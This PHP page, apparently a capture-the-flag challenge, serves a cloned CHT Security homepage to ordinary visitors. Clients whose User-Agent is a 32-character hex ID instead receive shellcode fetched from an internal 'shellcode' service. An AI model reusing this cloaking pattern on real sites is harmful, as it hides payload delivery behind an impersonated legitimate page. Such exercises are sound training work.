<?php
	$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
	// check if user agent only contains hex characters and length is 32
	if (preg_match('/^[0-9a-fA-F]{32}$/', $user_agent)) {
		$valid = true;
	} else {
		$valid = false;
	}
?>
<?php if ($valid): ?>
<?php
	// fetch userid
	$userid = strtolower($user_agent);
	// post to http://shellcode/generate
	$ch = curl_init('http://shellcode:5000/generate');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['userid' => $userid, 'challenge' => 'http']));
	$response = curl_exec($ch);
	curl_close($ch);

	echo $response;
?>	
<?php else: ?>
<!DOCTYPE html>
<html>

<head>
	<title>｜中華資安國際 CHT Security Co., Ltd.</title>

	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<link rel="icon" href="/images/favicon.ico">

	<!-- jquery -->
	<script src="/js/third-party/jquery-3.7.1.min.js"></script>

	
	<link href="/css/third-party/bootstrap.min5.33.css" rel="stylesheet">
	<script src="/js/third-party/bootstrap.bundle.min5.33.js"></script>
	
	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
	
	<link href="/css/third-party/animate3.5.2.min.css" rel="stylesheet">
	<link href="/css/font-icon.css" rel="stylesheet">
	<link href="/css/custom.css" rel="stylesheet">
	<link href="/css/header_menu.css" rel="stylesheet">
	<link href="/css/special_case.css" rel="stylesheet">
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined" rel="stylesheet">


	<script src="/js/vender/offcanvas.js"></script>
	<script src="/js/index.js"></script>
	<script src="/js/investor/nav-bar.js"></script>
	<!-- Google Material Icons -->
	<link
		href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined|Material+Symbols+Outlined|Material+Symbols+Rounded"
		rel="stylesheet">

	
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-714WVG1190"></script>

</head>

<body data-spy="scroll" data-offset="400">

	
	<input type="hidden" value="zh_TW" />

	
	<header class="fixed-top">

	<div id="nav_logo" class="container d-flex">
		<div class="align-self-center me-auto">
			<a class="brand-lg-only " href="/"> <img src="/images/logo.png">
			</a>
		</div>
		<div class="align-self-center s-brand-link me-3 pt-2">
			<form method="get" action="https://cse.google.com/cse" target="_blank">
				<input type="hidden" name="cx" value="d1f3fb9eb94fc49c2" />
				<input type="hidden" name="_csrf" value="NsNZ4qOLRS5SZ4jL-QxNXzaO3UtDGNRReYDtOCNl-8rF4q-7V_I_1MXvJkp_U736zyF5Ow-78CkgKLJ8HOTUCkVWmPKj283d" />
				<div class="input-group">
					<input type="text" name="q" id="search" size="25" value="" class="form-control search-input"
						placeholder="輸入關鍵字搜尋" style="max-height: 35px;">
					<div class="input-group-append">
						<button type="submit" value="Search" class="btn btn-outline-secondary search-button"
							style="max-height: 35px;">
							<span class="material-icons">search
							</span></button>
					</div>
				</div>
			</form>
		</div>
		<div class="align-self-center">
			<p class="s-brand-link">
				<a href="/?lang=zh_TW">繁體中文</a> | <a href="/?lang=en">English</a> | <a
					href="/?lang=ja">日本語</a>
			</p>
		</div>

	</div>
	<nav class="navbar navbar-expand-lg navbar-dark bg-nav">
		<div class="container">

			<a class="navbar-brand me-auto me-lg-0" href="/"><img src="/images/logo.png"></a>

			<button class="navbar-toggler border-0 " type="button" data-bs-toggle="offcanvas">
				<span class="navbar-toggler-icon"></span>
			</button>

			<div class="navbar-collapse offcanvas-collapse" id="navbarsmenu">
				<!-- japan -->
				

				<!-- TW or en -->
				<ul class="navbar-nav me-auto">

					<div class="language">
						<a href="/?lang=zh_TW">繁體中文</a><a href="/?lang=en">English</a><a href="/?lang=ja">日本語</a>
					</div>

					

					
					<li class="nav-item dropdown mega-dropdown"><a class="nav-link dropdown-toggle" href="#"
							id="dropdown01" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">關於我們</a>
						<div class="dropdown-menu mega-dropdown-menu" aria-labelledby="dropdown01">
							<div class="container">
								<ol>
									<ul>
										<li><a class="dropdown-item" href="/overview">公司簡介</a>
										</li>
										<li><a class="dropdown-item" href="/awards">認證與得獎</a></li>
										<li><a class="dropdown-item" href="/news">訊息專區</a></li>
										
										<li><a class="dropdown-item" href="/contactus">聯絡我們</a>
										</li>
										
									</ul>
									<ul>
										<h5>利害關係人專區</h5>
										<li>
											<a class="dropdown-item" href="/stakeholder">利害關係人</a>
										</li>
										<li>
											<a class="dropdown-item" href="/stakeholder/customer-handling">客戶申訴處理政策</a>
										</li>
									</ul>
								</ol>
							</div>
						</div>
					</li>

					

					<li class="nav-item dropdown mega-dropdown"><a class="nav-link dropdown-toggle" href="#"
							id="dropdown02" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">資安專業服務</a>
						<div class="dropdown-menu mega-dropdown-menu" aria-labelledby="dropdown02">
							<div class="container menu-item-container">
								<ol>
									<ul>
										<h5>資安檢測服務</h5>
										<li><a class="dropdown-item" href="/service/m101">源碼檢測服務</a></li>
										<li><a class="dropdown-item" href="/service/m102">弱點掃描服務</a></li>
										<li><a class="dropdown-item" href="/service/m113">網頁個資掃描服務</a></li>
										<li><a class="dropdown-item" href="/service/m103">滲透測試服務</a></li>
										<li><a class="dropdown-item" href="/service/m104">資安健診服務</a></li>
										<li><a class="dropdown-item" href="/service/m106">社交工程演練服務</a></li>
										<li><a class="dropdown-item" href="/service/m115">AI應用系統安全檢測服務</a></li>		
										<li><a class="dropdown-item" href="/service/m107">App檢測服務</a></li>
										<li><a class="dropdown-item" href="/service/m108">紅隊演練服務</a></li>
										<li><a class="dropdown-item" href="/service/m114">攻擊模擬演練服務</a></li>
										<li><a class="dropdown-item" href="/service/m109">電腦系統資訊安全評估</a></li>
										<li><a class="dropdown-item" href="/service/m110">IoT檢測</a></li>
										<li><a class="dropdown-item" href="/service/m111">DDoS攻防演練</a></li>
										<li><a class="dropdown-item" href="/service/m112">OT資安服務</a></li>
									</ul>
									<ul>
										<h5>資安管理與顧問服務</h5>
										<li><a class="dropdown-item" href="/service/m302">資通安全威脅偵測管理(SOC)服務</a></li>
										<li><a class="dropdown-item" href="/service/m401">資安事件處理與鑑識服務</a></li>
										<li><a class="dropdown-item" href="/service/m305">MDR威脅偵測應變服務</a></li>
										<li><a class="dropdown-item" href="/service/m405">網頁存活與異動監測服務</a></li>
										<li><a class="dropdown-item" href="/service/m402">PKI建置規劃</a></li>
										<li><a class="dropdown-item" href="/service/m403">ISMS/PIMS顧問輔導</a></li>
										<li><a class="dropdown-item" href="/service/m407">OT場域資安防護監測與應變服務</a></li>
									</ul>
									<ul>
										<h5>雲端資安服務</h5>
										<li><a class="dropdown-item" href="/service/m803">雲端資通安全威脅偵測管理(Cloud SOC)服務</a></li>
										<li><a class="dropdown-item" href="/service/m804">雲端資安健診服務</a></li>
										<li><a class="dropdown-item" href="/service/m801">資通安全弱點通報平台</a></li>
										<li><a class="dropdown-item" href="/solution/ms407">電子郵件警覺性測試服務</a></li>
										<li><a class="dropdown-item" href="/solution/ms405">日誌儲存雲</a></li>

									</ul>
									
										<ul>
											<h5>資安服務共契專區</h5>
											<li><a class="dropdown-item" href="/service/m706">資安共同供應契約</a></li>
											<li><a class="dropdown-item" href="/service/m701">資通安全威脅偵測管理(SOC)服務共同供應契約</a></li>
											<li><a class="dropdown-item" href="/service/m702">弱點檢測服務共同供應契約</a></li>
											<li><a class="dropdown-item" href="/service/m703">滲透測試服務共同供應契約</a></li>
											<li><a class="dropdown-item" href="/service/m704">資安健診服務共同供應契約</a></li>
											<li><a class="dropdown-item" href="/service/m705">社交工程演練服務共同供應契約</a></li>
										</ul>
									
								</ol>
							</div>
						</div>
					</li>

					
					<!-- show hv_active -->
					<li class="nav-item dropdown mega-dropdown" id="read-more-dropdown-id"><a
							class="nav-link dropdown-toggle" id="dropdown04" href="#" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">產品與解決方案</a>
						<!-- show -->
						<div class="dropdown-menu mega-dropdown-menu" id="read-more-dropdown-menu-id"
							aria-labelledby="dropdown04">
							<div class="container mn-hg-300">
								<ol>
									<ul>
										<h5>產品與解決方案</h5>
										<li><a class="dropdown-item" href="/solution/ms501">政府機關資安解決方案</a></li>
										<li><a class="dropdown-item" href="/solution/ms502">證券業資安解決方案</a></li>
										<li><a class="dropdown-item" href="/solution/ms503">製造業資安解決方案</a></li>
										<li><a class="dropdown-item" href="/solution/ms504">上市櫃公司資通安全管控指引解決方案</a></li>
									</ul>
									<ul>
										<h5 class="menu-fix-width">資安防護產品</h5>
										<ol id="all-security-product-id">
											<ul>
												<h5 class="pt-2"><a>網路及端點防護</a><span
														id="network-endpoint-security-product-id"
														class="headline-more-content">查看更多...</span>
												</h5>
												<li><a class="dropdown-item" href="/solution/ms101">SecuTex 先進資安威脅防禦系統</a></li>
												<li></li>
												<li><a class="dropdown-item" href="/solution/ms102">Fortinet Fortigate</a></li>
												<li><a class="dropdown-item" href="/solution/ms104">Palo Alto Network NGFW</a></li>
												<li><a class="dropdown-item" href="/solution/ms204">CrowdStrike Endpoint Protection</a></li>
												<li><a class="dropdown-item" href="/solution/ms420">IMPERVA SecureSphere</a></li>
												<li><a class="dropdown-item" href="/solution/ms103">Sophos NGFW</a></li>
												<li><a class="dropdown-item" href="/solution/ms203">FireEye Endpoint Security</a></li>

												<!-- if phone -->
												<li><a class="dropdown-item phone-dispaly"
														href="/solution/ms416">安瑞科技 ASF Series WAF</a></li>
												<li><a class="dropdown-item phone-dispaly"
														href="/solution/ms207">Gigamon 智慧型流量可視化分流平台</a></li>
												<li><a class="dropdown-item phone-dispaly" href="/solution/ms412">PacketX GRISM 智慧型全功能網路可視化平台</a></li>

											</ul>
											<ul>
												<h5 class="pt-2 "><a>弱點檢測</a><span
														id="vulnerability-scan-product-id" class="headline-more-content">查看更多...</span></h5>
												<li><a class="dropdown-item" href="/solution/ms417">資安眼HorusEyes</a></li>
												<li><a class="dropdown-item" href="/solution/ms411">Opentext Fortify WebInspect</a></li>
												<li><a class="dropdown-item" href="/solution/ms415">Tenable Security Center 弱點管理平台</a></li>
												<li><a class="dropdown-item" href="/solution/ms401">弱點管理平台 PRO</a></li>
												<!-- if phone -->
												<li><a class="dropdown-item phone-dispaly" href="/solution/ms410">Opentext Fortify SCA</a></li>
												<li><a class="dropdown-item phone-dispaly"
														href="/solution/ms414">Rapid7 InsightAppSec 網頁應用安全測試系統</a></li>


												<h5 class="pt-2"><a>存取管控</a><span
														id="access-control-id" class="headline-more-content">查看更多...</span></h5>
												<li><a class="dropdown-item" href="/solution/ms701">Forcepoint DLP</a></li>
												<li><a class="dropdown-item" href="/solution/ms408">e-SOFT SIP內網資安部署管理系統 NAC++</a></li>
												<!-- 待優化 -->
												<!-- <li><a class="dropdown-item" th:if="${#locale.language.equals('en')}" th:href="@{/solution/ms408}" th:text="#{com.ms408}"></a></li> -->
												<!-- if phone -->
												<!-- <li><a class="dropdown-item phone-dispaly" th:if="${#locale.language.equals('zh')}" th:href="@{/solution/ms408}" th:text="#{com.ms408}"></a></li> -->
											</ul>
											<ul>
												<h5 class="pt-2"><a>資安管理</a><span
														id="security-management-product-id"
														class="headline-more-content">查看更多...</span>
												</h5>
												<li><a class="dropdown-item" href="/solution/ms302">CypherCom 端對端加密通訊系統</a></li>
												<li><a class="dropdown-item" href="/solution/ms424">OETH雲端身分認證SaaS服務</a></li>
												<li><a class="dropdown-item" href="/solution/ms409">Opentext ArcSight Logger</a></li>
												<li><a class="dropdown-item" href="/solution/ms413">瑞思資訊 RapixEngine</a></li>
												<!-- if phone -->
												<li><a class="dropdown-item phone-dispaly"
														href="/solution/ms421">Nutanix HCI超融合基礎架構</a></li>
												<li><a class="dropdown-item phone-dispaly" href="/solution/ms301">Secure Element 硬體安全元件</a></li>
												<li><a class="dropdown-item phone-dispaly"
														href="/solution/ms304">Trellix Email Security</a></li>
												<li><a class="dropdown-item phone-dispaly"
														href="https://secure365.hinet.net/EnterpriseSecurity/product/inner.do?product_id=4878f87c4e000000c6c2598409c2cba5"
														target="_blank">Securebox檔案防護</a></li>
												<li><a class="dropdown-item phone-dispaly" href="/solution/ms404">電子郵件警覺性測試系統</a></li>
												<li><a class="dropdown-item phone-dispaly" href="/solution/ms406">遠距辦公解決方案</a></li>

												<h5 class="pt-2 "><a>備份備援</a><span id="backup-product-id"
														class="headline-more-content">查看更多...</span>
												</h5>
												<li><a class="dropdown-item" href="/solution/ms423">Veeam</a></li>
												<li><a class="dropdown-item" href="/solution/ms422">Commvault</a></li>

											</ul>
										</ol>

										<ol id="network-endpoint-security-product-id-more" class="product-more">
											<ul>
												<h5 class="pt-2 sub-menu-fix-width"><a>網路及端點防護</a><span
														class="headline-to-back">x</span></h5>
												<ol>
													<ul>
														<li><a class="dropdown-item" href="/solution/ms101">SecuTex 先進資安威脅防禦系統</a></li>
														<li></li>
														<li><a class="dropdown-item" href="/solution/ms102">Fortinet Fortigate</a></li>
														<li><a class="dropdown-item" href="/solution/ms104">Palo Alto Network NGFW</a></li>
														<li><a class="dropdown-item" href="/solution/ms204">CrowdStrike Endpoint Protection</a></li>
														<li><a class="dropdown-item"
																href="/solution/ms420">IMPERVA SecureSphere</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms103">Sophos NGFW</a></li>
														<li><a class="dropdown-item" href="/solution/ms203">FireEye Endpoint Security</a></li>
													</ul>
													<ul>
														<li><a class="dropdown-item"
																href="/solution/ms416">安瑞科技 ASF Series WAF</a>
														</li>
														<li><a class="dropdown-item"
																href="/solution/ms207">Gigamon 智慧型流量可視化分流平台</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms412">PacketX GRISM 智慧型全功能網路可視化平台</a></li>
													</ul>
												</ol>
											</ul>
										</ol>
										<ol id="vulnerability-scan-product-id-more" class="product-more">
											<ul>
												<h5 class="pt-2 sub-menu-fix-width"><a>弱點檢測</a><span
														class="headline-to-back">x</span></h5>
												<ol>
													<ul>
														<li><a class="dropdown-item" href="/solution/ms417">資安眼HorusEyes</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms411">Opentext Fortify WebInspect</a></li>
														<li><a class="dropdown-item"
																href="/solution/ms415">Tenable Security Center 弱點管理平台</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms401">弱點管理平台 PRO</a></li>
														<li><a class="dropdown-item" href="/solution/ms410">Opentext Fortify SCA</a></li>
														<li><a class="dropdown-item"
																href="/solution/ms414">Rapid7 InsightAppSec 網頁應用安全測試系統</a>
														</li>

													</ul>
												</ol>
											</ul>
										</ol>
										<ol id="access-control-id-more" class="product-more">
											<ul>
												<h5 class="pt-2 sub-menu-fix-width"><a>存取管控</a><span
														class="headline-to-back">x</span></h5>
												<ol>
													<ul>
														<li><a class="dropdown-item"
																href="/solution/ms701">Forcepoint DLP</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms408">e-SOFT SIP內網資安部署管理系統 NAC++</a></li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
													</ul>
												</ol>
											</ul>
										</ol>
										<ol id="security-management-product-id-more" class="product-more">
											<ul>
												<h5 class="pt-2 sub-menu-fix-width"><a>資安管理</a><span
														class="headline-to-back">x</span></h5>
												<ol>
													<ul>
														<li><a class="dropdown-item" href="/solution/ms302">CypherCom 端對端加密通訊系統</a></li>
														<li><a class="dropdown-item"
																href="/solution/ms424">OETH雲端身分認證SaaS服務</a>
														</li>
														<li><a class="dropdown-item"
																href="/solution/ms413">瑞思資訊 RapixEngine</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms409">Opentext ArcSight Logger</a></li>
														<li><a class="dropdown-item"
																href="/solution/ms421">Nutanix HCI超融合基礎架構</a>
														</li>
														<li><a class="dropdown-item" href="/solution/ms301">Secure Element 硬體安全元件</a></li>


													</ul>
													<ul>
														<li><a class="dropdown-item"
																href="/solution/ms304">Trellix Email Security</a>
														</li>
														<li><a class="dropdown-item"
																href="https://secure365.hinet.net/EnterpriseSecurity/product/inner.do?product_id=4878f87c4e000000c6c2598409c2cba5"
																target="_blank">Securebox檔案防護</a></li>
														<li><a class="dropdown-item" href="/solution/ms404">電子郵件警覺性測試系統</a></li>
														<li><a class="dropdown-item" href="/solution/ms406">遠距辦公解決方案</a></li>
													</ul>
												</ol>
											</ul>
										</ol>
										<ol id="backup-product-id-more" class="product-more">
											<ul>
												<h5 class="pt-2 sub-menu-fix-width"><a>備份備援</a><span
														class="headline-to-back">x</span></h5>
												<ol>
													<ul>
														<li><a class="dropdown-item"
																href="/solution/ms423">Veeam</a>
														</li>
														<li><a class="dropdown-item"
																href="/solution/ms422">Commvault</a>
														</li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
														<li><a class="dropdown-item" style="visibility: hidden">None</a>
														</li>
													</ul>
												</ol>
											</ul>
										</ol>
									</ul>
								</ol>
							</div>
						</div>
					</li>
					
					<li class="nav-item dropdown mega-dropdown"><a class="nav-link dropdown-toggle" href="#"
							id="dropdown03" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">上網資安</a>
						<div class="dropdown-menu mega-dropdown-menu" aria-labelledby="dropdown03">
							<div class="container">
								<ol>
									<ul>
										<h5>個人/家庭</h5>
										<li><a class="dropdown-item" href="https://keeper.hisecure.hinet.net/"
												target="_blank">防駭守門員</a></li>
										<li><a class="dropdown-item" href="https://familycare.hinet.net/"
												target="_blank">色情守門員</a></li>
										<li><a class="dropdown-item" href="https://timecontrol.hinet.net/"
												target="_blank">上網時間管理</a></li>
										<li><a class="dropdown-item" href="https://hisecure.hinet.net/" target="_blank">HiNet 防毒防駭</a></li>
										<li><a class="dropdown-item" href="/solution/ms601">防詐隊長</a></li>
									</ul>
									<ul>
										<h5>企業上網資安</h5>
										<li><a class="dropdown-item" href="https://secure365.hinet.net/product/22"
												target="_blank">HiNet入侵防護服務</a></li>
										<li><a class="dropdown-item" href="https://secure365.hinet.net/product/23"
												target="_blank">HiNet DDoS防護服務</a></li>
										<li><a class="dropdown-item" href="https://secure365.hinet.net/product/60"
												target="_blank">HiNet先進網路防禦系統服務(ANDs)</a></li>
										<li><a class="dropdown-item" href="https://secure365.hinet.net/product/58"
												target="_blank">HiNet企業防駭守門員</a></li>
										<li><a class="dropdown-item" href="https://secure365.hinet.net/product/66"
												target="_blank">HiNet WAF服務</a></li>
										<li><a class="dropdown-item" href="/solution/ms602">WAAP多合一網站應用與API防護服務</a>
										</li>
									</ul>
								</ol>
							</div>
						</div>
					</li>
					<li class="nav-item">
						<a class="nav-link" href="https://www.104.com.tw/company/1a2x6bkbsb" target="_blank">人才招募</a>
					</li>



					<li class="nav-item dropdown mega-dropdown">
						<a class="nav-link dropdown-toggle" href="#" id="dropdown-stock" data-bs-toggle="dropdown"
							aria-haspopup="true" aria-expanded="false">投資人專區</a>
						<div class="dropdown-menu mega-dropdown-menu" aria-labelledby="dropdown-stock">
							<div class="container menu-item-container">
								<ol class="row">
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>財務資訊　　</h5>
										<li><a class="dropdown-item" href="/investor/finance?tab=month">月營收</a></li>
										<li><a class="dropdown-item" href="/investor/finance?tab=quarterly">季財報</a></li>
										<li><a class="dropdown-item" href="/investor/finance?tab=year">年報</a></li>
									</ul>
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>股東專欄　　</h5>
										<li><a class="dropdown-item" href="/investor/shareholder?tab=shareholder">股東會</a></li>
										<li><a class="dropdown-item" href="/investor/shareholder?tab=dividend">股利資訊</a></li>
										<li><a class="dropdown-item"
												href="/investor/shareholder?tab=main-shareholder">主要股東</a></li>
									</ul>

									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>法說會</h5>
										<li><a class="dropdown-item" href="/investor/earnings">法說會　　</a></li>
									</ul>
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>公司治理　　</h5>
										<li><a class="dropdown-item" href="/investor/governance?tab=organization">組織架構</a></li>
										<li><a class="dropdown-item"
												href="/investor/governance?tab=board-of-director">董事會資訊</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=committee">功能性委員會</a></li>
										<li><a class="dropdown-item"
												href="/investor/governance?tab=company-regulations">公司重要規章</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=auditor">內部稽核</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=operate">誠信經營</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=security">資訊安全與隱私保護</a></li>
									</ul>
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>重大訊息</h5>
										<li><a class="dropdown-item" target="_blank"
												href="https://mops.twse.com.tw/mops/#/web/t05st01?companyId=7765&amp;month=all&amp;year=114&amp;firstDay=&amp;lastDay">重大訊息　　</a>
										</li>
									</ul>
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>常見問題</h5>
										<li><a class="dropdown-item" href="/investor/question">常見問題　　</a></li>
									</ul>
									<ul class="col-lg-3 col-md-12 col-sm-12">
										<h5>聯絡我們</h5>
										<li><a class="dropdown-item" href="/investor/contact">聯絡我們　　</a></li>
									</ul>
								</ol>
							</div>
						</div>
					</li>


					<li class="nav-item dropdown mega-dropdown">
						<a class="nav-link dropdown-toggle" href="#" id="dropdown-esg" data-bs-toggle="dropdown"
							aria-haspopup="true" aria-expanded="false">ESG企業永續</a>
						<div class="dropdown-menu mega-dropdown-menu" aria-labelledby="dropdown-esg">
							<div class="container menu-item-container">
								<ol>
									<ul>
										<h5>ESG企業永續</h5>
										<li>
											<a class="dropdown-item" href="/esg/environment">環境保護　</a>
										</li>
									</ul>

									<ul>
										<h5>社會責任</h5>
										<li>
											<a class="dropdown-item" href="/esg/responsibility?tab=welfare">薪酬與福利</a>
											<a class="dropdown-item" href="/esg/responsibility?tab=human">人權政策</a>
										</li>
									</ul>

									<ul>
										<h5>公司治理　　</h5>
										<li><a class="dropdown-item" href="/investor/governance?tab=organization">組織架構</a></li>
										<li><a class="dropdown-item"
												href="/investor/governance?tab=board-of-director">董事會資訊</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=committee">功能性委員會</a></li>
										<li><a class="dropdown-item"
												href="/investor/governance?tab=company-regulations">公司重要規章</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=auditor">內部稽核</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=operate">誠信經營</a></li>
										<li><a class="dropdown-item" href="/investor/governance?tab=security">資訊安全與隱私保護</a></li>
									</ul>

								</ol>
							</div>
						</div>
					</li>


				</ul>

			</div>
		</div>
	</nav>


</header>

	
	<main role="main" class="main-nopadding">
<link href="/banner.css" rel="stylesheet"/>
<div id="carousel" class="carousel slide" data-ride="carousel" data-interval="6000">
	<ol class="carousel-indicators">
		<button type="button" data-bs-target="#carousel" data-bs-slide-to="0" class="active">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="1">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="2">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="3">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="4">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="5">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="6">
		</button><button type="button" data-bs-target="#carousel" data-bs-slide-to="7">
		</button>
	</ol>
	<div class="carousel-inner" role="listbox">
		<div class="carousel-item active">
			<a href="https://www.chtsecurity.com/news/ccac6c6b-b6b7-436e-ba83-7928d3c36865">
				<div class="banner-72bb4319-6ad9-456a-8f32-b0f0b87e67d6"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="https://www.chtsecurity.com/solution/ms417">
				<div class="banner-64a6cc85-cbfd-4f85-bdb0-a758cd75d922"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/service/m305">
				<div class="banner-501c1a12-3040-4e6c-9337-cf7f2549d787"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/service/m108">
				<div class="banner-e20d5afb-fab0-4843-9db7-2881e7ec3bb0"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/solution/ms101">
				<div class="banner-601aaa25-0ab3-4142-9fc4-d36dd8526600"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/service/m801">
				<div class="banner-cb7e83c8-38a3-4e84-9216-266a172901c4"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/service/m302">
				<div class="banner-5e384e68-09c7-4e7f-ab07-ab8f77097903"></div>
			</a>
		</div>
		<div class="carousel-item">
			<a href="/service/m706">
				<div class="banner-e709894b-f16d-443e-9383-f80d73c0cdd9"></div>
			</a>
		</div>
	</div>

	<a class="carousel-control-prev" href="#carousel" role="button" data-bs-slide="prev" data-bs-target="#carousel"> 
		<span class="carousel-control-prev-icon" aria-hidden="true"></span> <span class="sr-only">Previous</span>
	</a> 
	
	<a class="carousel-control-next" href="#carousel" role="button" data-bs-slide="next" data-bs-target="#carousel"> 
		<span class="carousel-control-next-icon" aria-hidden="true"></span> <span class="sr-only">Next</span>
	</a>
</div>

<div class="container padding-main">
	<div class="row">
		<div class="col-lg">
			<div class="title-line">
				<h3>最新消息</h3>
				<hr>
			</div>
			<div class="idx_news animated fadeInRight">
				<ul>
					<li>
						<img src="/images/archive/(2025-10-21_06-23-26) icon.jpg">
						<p class="news_title text-truncate">
							<a title="中華資安國際總經理洪進福榮獲114年傑出資訊人才獎" href="/news/715db996-b955-4826-b680-661b94332621">中華資安國際總經理洪進福榮獲114年傑出資訊人才獎</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
								<p>得獎理由2017年12月創立中華資安國際股份有限公司，成立第一年就獲利，歷年營收與獲利屢創新高，營收年複合成長率(CAGR)30%以上，獲利(CAGR) 102%以上，高於台灣資安市場的平均成長率。帶領公司成為唯一連續六年獲行政院資安服務廠商評鑑 5A 最高評價的資安服務廠商，並積極推動公司公開發行(IPO)，並已獲臺灣證交所上市申請核准。帶領資安技術團隊及研發團隊精進資安專業服務技術及研發自有資安產品，跨足工控資安、無人機資安、雲端資安、物聯網資安、AI 資安、低軌衛星安全等新興領域及拓展海外市場，帶領團隊從資安服務公司拓展成為國際化的資安服務與產品公司。得獎感言非常榮幸獲頒「114資訊月傑出資訊人才獎」，這份殊榮不僅是對中華資安長期耕耘資安領域的肯定，更是對我與專業團隊的莫大鼓勵，衷心感謝評審委員的認可。資訊安全是數位時代的關鍵命脈，也是科技發展的基石，面對層出不窮的網路威脅，我們會持續以專業、創新與熱忱來守護各行各業與民眾的資訊安全。在此，特別感謝中華電信集團所有長官、團隊與合作夥伴們的支持，這個獎項激勵我們不斷追求資安卓越，我們也將持續科技創新與資安人才培育，打造更具韌性的數位安全環境，提升台灣資安產業的國際競爭力，讓世界看見台灣。謝謝大家！未來我會繼續秉持技術本質，傳達駭客思維的價值，持續培育更多臺灣資安新血，促進資安環境跟產業結構的升級。更重要的是，與業界夥伴們共同拓展資安產業，幫助台灣豐厚資安實力，讓更多人才在全球舞台大放異彩。詳細獲獎資訊可至114傑出資訊人才</p>
							</div>
							<a href="/news/715db996-b955-4826-b680-661b94332621" class="float-right">更多</a>
						</div>
					</li>
					<li>
						<img src="/images/archive/(2025-10-21_01-54-26) 0000.jpg">
						<p class="news_title text-truncate">
							<a title="駭客瞄準中小企業！小叮噹科學主題樂園導入中華電信企業防駭守門員，贏得遊客信賴" href="/news/eceae0ee-48c3-4edc-9495-2088ceebfc28">駭客瞄準中小企業！小叮噹科學主題樂園導入中華電信企業防駭守門員，贏得遊客信賴</a>
						</p>
						<div class="news_article">
							<div class="preview_article">
